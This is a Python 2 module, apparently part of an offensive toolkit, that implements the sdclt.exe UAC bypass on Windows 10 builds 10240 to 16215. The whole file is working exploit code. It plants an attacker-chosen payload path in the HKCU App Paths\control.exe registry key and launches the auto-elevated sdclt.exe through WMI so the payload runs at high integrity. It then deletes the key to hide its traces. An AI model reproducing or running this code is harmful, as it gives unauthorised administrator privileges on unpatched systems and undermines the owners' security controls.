"""
Works from: Windows 10 TH1 (10240)
Fixed in: Windows 10 RS3 (16215)
"""
import os
import wmi
import time
import _winreg
import win32con
from core.prints import *

wmi = wmi.WMI()

def sdclt_control(payload):
	print """
 -------------------------------------------------------------
 sdclt.exe is an auto-elevated binary that is
 vulnerable to file handler hijacking. 
 
 Read access to HKCU\Software\Microsoft\Windows\
 CurrentVersion\App Paths\control.exe is performed upon
 execution. Due to the registry key being accessible from
 user mode, an arbitrary executable file can be injected.

 When everything worked correctly, the payload should be
 spawned with high IL.
 -------------------------------------------------------------
 """
	print_info("Payload: {}".format(payload))
	print_info("Attempting to create registry key")
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
					os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
								
		_winreg.SetValueEx(key,
				None,
				0,
				_winreg.REG_SZ,
				payload)
		_winreg.CloseKey(key)
		print_success("Registry key created")
	except Exception as error:
		print_error("Unable to create key")
		return False
		
	print_info("Pausing for 5 seconds before executing")
	time.sleep(5)

	print_info("Attempting to create process")
	try:
		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start sdclt.exe",
						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
		if (result[1] == 0):
			print_success("Process started successfully")
		else:
			print_error("Problem creating process")
	except Exception as error:
		print_error("Problem creating process")
		return False

	print_info("Pausing for 5 seconds before cleaning")
	time.sleep(5)
	
	print_info("Attempting to remove registry key")
	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
				os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
		print_success("Registry key was deleted")
	except Exception as error:
		print_error("Unable to delete key")
		return False
